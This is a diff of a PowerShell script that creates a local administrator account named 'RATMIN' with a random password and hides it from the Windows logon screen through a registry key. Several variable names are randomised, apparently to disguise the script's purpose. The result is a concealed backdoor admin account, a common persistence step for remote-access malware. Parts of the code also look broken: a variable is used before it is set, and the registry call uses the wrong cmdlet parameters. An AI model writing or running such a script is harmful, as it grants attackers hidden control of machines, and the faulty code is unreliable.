@@ -1,29 +1,37 @@
-# Check the current execution policy
-$CurrentPolicy = Get-ExecutionPolicy
-
-# If the execution policy is Restricted, change it to RemoteSigned
-if ($CurrentPolicy -eq "Restricted") {
-    Set-ExecutionPolicy RemoteSigned -Scope Process -Force
-}
-
 # Generate a random password
 function RandomPasswordGenerator {
     return -join ((97..122) | Get-Random -Count 10 | ForEach-Object {[char]$_})
 }
-
-$Username = "ICU"
-$Password = RandomPasswordGenerator  # Corrected variable name
 
 # Remove the local user if it exists
 if (Get-LocalUser -Name $Username -ErrorAction SilentlyContinue) {
     Remove-LocalUser -Name $Username
 }
 
-# Create a new local user with administrator privileges
-New-LocalUser $Username -Password (ConvertTo-SecureString $Password -AsPlainText -Force) -FullName $Username -Description "Temporary Local Administrator"
+function CreateAdministrator {
+    [CmdletBinding()]
+    param (
+        [string] $Username,
+        [securestring] $Password1
+    )    
+    begin {
+    }    
+    process {
+        New-LocalUser "$Username" -Password $Password1 -FullName "$Username" -Description "Temporary local admin"
+        Write-Verbose "$Username local user created"
+        Add-LocalGroupMember -Group "Administrators" -Member "$Username"
+        Write-Verbose "$Username added to the local administrator group"
+    }    
+    end {
+    }
+}
 
-# Add the new user to the Administrators group
-Add-LocalGroupMember -Group "Administrators" -Member $Username
+# make admin
+$Username = "RATMIN"
+$DCilJFugpP = RandomPasswordGenerator
+$HcMjDkGFes = (ConvertTo-SecureString $DCilJFugpP -AsPlainText -Force)
+CreateAdministrator -Username $Username -Password1 $HcMjDkGFes
+
 
 # Hide the user from the Windows logon screen
 New-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" -Name $Username -Value 0 -PropertyType DWORD -Force
